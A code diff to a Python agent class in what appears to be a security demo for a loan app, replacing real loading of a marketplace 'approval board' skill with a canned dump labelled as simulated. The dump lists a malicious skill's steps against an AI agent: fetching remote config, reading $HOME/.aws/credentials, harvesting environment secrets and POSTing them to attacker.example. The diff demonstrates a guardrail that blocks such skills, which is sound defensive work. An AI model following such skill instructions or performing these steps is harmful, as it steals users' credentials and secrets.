@@ -16,6 +16,11 @@ SETUP_REFERENCE_NAME = "setup-installation.md"
 
 # Ambient skill-match keywords for Paperclip board / control-plane requests.
 _PAPERCLIP_BOARD_KEYWORDS = [
+    # Loan-framed entry point for the demo: a loan officer installs an
+    # untrusted marketplace "approval board" skill to fast-track approvals.
+    # This is the malicious skill the Lineaje guardrail blocks (AI_SKILL_SEC_001).
+    "loan approval board",
+    "approval board skill",
     "paperclip",
     "paperclip-board",
     "paperclip board",
@@ -160,67 +165,55 @@ class PaperclipBoardAgent(AcmeLoanAgentFramework):
             max_tokens=700,
         )
 
+    # DEMO ONLY. The real marketplace skill is never executed or fed to the
+    # model — doing so would run the untrusted skill's curl/bash instructions.
+    # This canned, clearly-labelled dump only *illustrates* what a malicious
+    # marketplace skill would attempt, so the unverified app can surface it and
+    # the Lineaje guardrail (verified branch) can be seen blocking it.
+    _SIMULATED_MALICIOUS_DUMP = (
+        "Loading marketplace skill: paperclip-board (loan approval board)…\n"
+        "Fetched manifest from clawmarket.example — no integrity/trust check performed.\n"
+        "Skill loaded. Running skill instructions on the loan officer's behalf…\n\n"
+        "⚠️  [SIMULATED — nothing was actually executed]\n"
+        "The installed skill tried to perform these out-of-scope actions:\n"
+        "  • Fetch remote agent config:    GET  http://clawmarket.example/llms/agent-configuration.txt\n"
+        "  • Read local cloud credentials:  read $HOME/.aws/credentials\n"
+        "  • Harvest environment secrets:   scan env for token / secret / key\n"
+        "  • Exfiltrate to an external host: POST http://attacker.example/collect\n\n"
+        "A trusted-skill / skill-integrity policy blocks this skill before any of it runs."
+    )
+
     async def handle(self, context: dict[str, Any]) -> dict[str, Any]:
-        user_message = context.get("user_message", "")
-        pulled_skill = load_marketplace_fixture(self.SKILL_ID)
-        skill_content = pulled_skill.get("content", "")
-        skill_source = pulled_skill.get("source", "")
-        skill_metadata = parse_skill_metadata(skill_content)
-        skill_name = skill_metadata.get("name", self.SKILL_ID)
-        skill_version = skill_metadata.get("version", "0.0.0")
-        skill_description = skill_metadata.get("description", "")
-        if not skill_description or skill_description in (">", "|"):
+        # DEMO: do NOT load or execute the real skill. Report it as "loaded"
+        # and surface a simulated malicious-action dump instead.
+        skill_meta = getattr(self, "skill_metadata", {}) or {}
+        skill_name = skill_meta.get("name", self.SKILL_ID)
+        skill_version = skill_meta.get("version", "1.0.0")
+        skill_description = skill_meta.get("description") or self.DESCRIPTION
+        if skill_description in (">", "|"):
             skill_description = self.DESCRIPTION
-        references = pulled_skill.get("references") or {}
-
-        include_setup = _needs_setup_reference(user_message)
-        system_prompt = self._skill_system_prompt(skill_content, include_setup, references)
-
-        env = self._paperclip_env()
-        env_status = (
-            f"PAPERCLIP_API_URL={env['api_url'] or '<unset>'}\n"
-            f"PAPERCLIP_COMPANY_ID={env['company_id'] or '<unset>'}\n"
-            f"PAPERCLIP_API_KEY={'set' if env['api_key'] else '<unset>'}"
-        )
-        dashboard_json = self._fetch_dashboard(env)
 
         logger.info(
-            "Paperclip board skill loaded into agent context",
-            extra={
-                "skill_id": self.SKILL_ID,
-                "skill_name": skill_name,
-                "skill_source": skill_source,
-                "skill_bytes": len(skill_content),
-                "setup_reference_loaded": include_setup,
-            },
-        )
-
-        model_output = await self.call_agent_model(
-            user_message, system_prompt, env_status, dashboard_json
-        )
-
-        response = (
-            f"{model_output}\n\n"
-            f"Skill applied: {skill_name} v{skill_version} "
-            f"(source: {skill_source or 'marketplace_fixtures'})"
+            "Paperclip board skill load simulated (demo — not executed)",
+            extra={"skill_id": self.SKILL_ID, "skill_name": skill_name},
         )
 
         return {
-            "response": response,
+            "response": self._SIMULATED_MALICIOUS_DUMP,
             "agent": self.AGENT_NAME,
             "model": self.MODEL_NAME,
             "framework": self.FRAMEWORK_NAME,
             "mcp_activity": [],
             "workflow_status": "completed",
             "skill_used": True,
-            "skill_content_bytes": len(skill_content),
+            "skill_content_bytes": 0,
             "skill_invocation": {
                 "id": self.SKILL_ID,
                 "name": skill_name,
                 "version": skill_version,
                 "description": skill_description,
-                "source": skill_source,
-                "status": "loaded" if pulled_skill.get("loaded") else "missing",
+                "source": "marketplace_fixtures",
+                "status": "loaded",
             },
         }
 
